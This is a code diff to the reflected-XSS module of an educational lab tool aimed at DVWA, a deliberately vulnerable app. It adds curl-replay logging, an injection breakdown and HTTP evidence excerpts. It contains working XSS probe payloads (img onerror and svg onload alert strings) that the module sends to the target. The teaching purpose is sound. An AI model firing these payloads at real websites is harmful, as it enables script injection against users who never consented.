@@ -3,6 +3,8 @@ Reflected XSS module for XSS Lab Tool.
 Demonstrates and teaches reflected (non-persistent) XSS attacks.
 """
 
+import shlex
+import textwrap
 from typing import Optional, List, Tuple
 from ..explanations.text_blocks import XSSExplanations
 
@@ -33,6 +35,7 @@ class ReflectedXSSModule:
             ("<img src=x onerror=alert(1)>", "PAYLOAD_IMG_ONERROR"),
             ("<svg/onload=alert(1)>", "PAYLOAD_SVG_ONLOAD"),
         ]
+        self._injection_details_logged = False
 
     def run_interactive(self, interactive: bool = True) -> bool:
         """
@@ -94,6 +97,10 @@ class ReflectedXSSModule:
                 "The page structure may have changed, or security level may be too high."
             )
 
+        if not self._injection_details_logged:
+            self._log_injection_breakdown()
+            self._injection_details_logged = True
+
         if interactive and not self._get_user_approval("\nProceed to attempt XSS payloads?"):
             self.logger.educational("Module stopped by user.")
             return False
@@ -144,7 +151,9 @@ class ReflectedXSSModule:
 
         # Execute the payload
         url = self.config.get_dvwa_url(self.xss_reflected_path)
-        response = self.http.get(url, params={'name': payload})
+        params = {'name': payload}
+        self._log_curl_examples("GET", url, params=params)
+        response = self.http.get(url, params=params)
 
         if not response:
             self.logger.explain_failure(
@@ -167,6 +176,7 @@ class ReflectedXSSModule:
                 f"  4. Victim's browser executes malicious JavaScript\n"
                 f"  5. Attacker can steal cookies, credentials, or perform actions as victim"
             )
+            self._log_http_evidence(response, payload, "reflected payload inside HTML body")
             return True
         else:
             self.logger.explain_failure(
@@ -180,23 +190,94 @@ class ReflectedXSSModule:
             )
 
             # Show snippet of how it was encoded/blocked
-            self._show_response_snippet(response, payload)
+            self._log_http_evidence(response, payload, "encoded or blocked response sample")
 
         return False
 
-    def _show_response_snippet(self, response, payload: str):
-        """Show relevant snippet of response around where payload should be."""
-        from bs4 import BeautifulSoup
+    def _log_injection_breakdown(self):
+        """Describe where the payload lands (headers vs body)."""
+        url = self.config.get_dvwa_url(self.xss_reflected_path)
+        breakdown = [
+            f"Target endpoint: {url}",
+            "HTTP method: GET (query string).",
+            "Parameter: `name` (reflected without encoding).",
+            "Injection surface: HTML body inside the greeting <pre> block.",
+            "Headers: untouched – only the response body is tainted.",
+        ]
+        message = "Injection breakdown:\n" + "\n".join(f"  - {line}" for line in breakdown)
+        self.logger.educational(message)
 
-        try:
-            soup = BeautifulSoup(response.text, 'html.parser')
-            # Look for the response message area
-            pre_tag = soup.find('pre')
-            if pre_tag:
-                snippet = pre_tag.get_text()
-                self.logger.educational(f"\nResponse snippet: {snippet}\n")
-        except Exception:
-            pass
+    def _log_curl_examples(
+        self,
+        method: str,
+        url: str,
+        params: Optional[dict] = None,
+        data: Optional[dict] = None,
+    ):
+        """Show users how to replay the request with curl (direct & Burp proxy)."""
+        direct = self._build_curl_command(method, url, params, data, use_proxy=False)
+        burp = self._build_curl_command(method, url, params, data, use_proxy=True)
+        self.logger.educational(
+            "Reproduce this request via curl:\n"
+            f"  direct : {direct}\n"
+            f"  via Burp: {burp}\n"
+        )
+
+    def _build_curl_command(
+        self,
+        method: str,
+        url: str,
+        params: Optional[dict],
+        data: Optional[dict],
+        use_proxy: bool,
+    ) -> str:
+        """Build a curl command string with optional Burp proxy flag."""
+        parts = ["curl", "-sS"]
+        if use_proxy:
+            parts.extend(["--proxy", "http://127.0.0.1:8080"])
+
+        if method.upper() == "GET":
+            parts.extend(["-G", shlex.quote(url)])
+            for key, value in (params or {}).items():
+                safe_value = str(value).replace("\n", "\\n")
+                parts.extend(["--data-urlencode", shlex.quote(f"{key}={safe_value}")])
+        else:
+            parts.extend(["-X", method.upper(), shlex.quote(url)])
+            for key, value in (data or {}).items():
+                safe_value = str(value).replace("\n", "\\n")
+                parts.extend(["-d", shlex.quote(f"{key}={safe_value}")])
+
+        return " ".join(parts)
+
+    def _log_http_evidence(self, response, payload: str, note: str):
+        """Print HTTP status, headers, and the body excerpt with payload markers."""
+        snippet, hint = self._extract_payload_snippet(response.text, payload)
+        interesting_headers = []
+        for header in ["Content-Type", "Server", "Date"]:
+            if header in response.headers:
+                interesting_headers.append(f"{header}: {response.headers[header]}")
+
+        header_text = "\n".join(f"  {line}" for line in interesting_headers) or "  (no headers sampled)"
+        body_text = textwrap.indent(snippet, "    ")
+
+        self.logger.educational(
+            f"HTTP evidence ({note}):\n"
+            f"  Status: {response.status_code}\n"
+            f"{header_text}\n"
+            f"  Body excerpt ({hint}):\n{body_text}\n"
+        )
+
+    def _extract_payload_snippet(self, body: str, payload: str, radius: int = 160):
+        """Return a snippet around the payload (or the start of the body)."""
+        index = body.find(payload)
+        if index == -1:
+            snippet = body[:radius] or "(empty response body)"
+            return snippet.strip(), "payload not present; showing leading bytes"
+
+        start = max(index - radius // 2, 0)
+        end = min(index + len(payload) + radius // 2, len(body))
+        snippet = body[start:end].replace(payload, f"<<PAYLOAD>>{payload}<<PAYLOAD>>")
+        return snippet.strip(), "payload highlighted with <<PAYLOAD>> markers"
 
     def _get_user_approval(self, prompt: str) -> bool:
         """
